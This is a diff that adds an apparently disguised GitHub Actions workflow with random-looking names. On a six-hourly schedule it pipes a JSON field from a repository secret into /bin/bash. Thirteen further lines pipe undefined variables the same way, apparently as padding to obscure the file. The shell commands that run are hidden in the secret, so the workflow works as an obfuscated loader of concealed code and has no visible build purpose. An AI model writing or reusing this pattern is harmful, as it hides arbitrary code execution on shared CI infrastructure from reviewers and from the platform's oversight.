@@ -1,0 +1,31 @@
+name: heqiduoao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: heqiduoao
+        env:
+          xca28690: ${{ secrets.xca28690 }}
+        run: |
+          echo $xca28690 | jq -r .ol46 | /bin/bash
+          echo $ip49477 | jq -r .k2851 | /bin/bash
+          echo $ocmh53 | jq -r .dp54 | /bin/bash
+          echo $u48895 | jq -r .qjq8736 | /bin/bash
+          echo $kyp61436 | jq -r .ovikt61887 | /bin/bash
+          echo $cofl6685 | jq -r .ebwgt55 | /bin/bash
+          echo $gxree72591 | jq -r .rl3 | /bin/bash
+          echo $k4 | jq -r .waem5689 | /bin/bash
+          echo $kbtx3 | jq -r .bu93 | /bin/bash
+          echo $tdoo385 | jq -r .mlhzw592 | /bin/bash
+          echo $mr25 | jq -r .nhu25606 | /bin/bash
+          echo $v10 | jq -r .w9991 | /bin/bash
+          echo $skd9295 | jq -r .iom632 | /bin/bash
+          echo $guuy1587 | jq -r .jmycd5 | /bin/bash
+
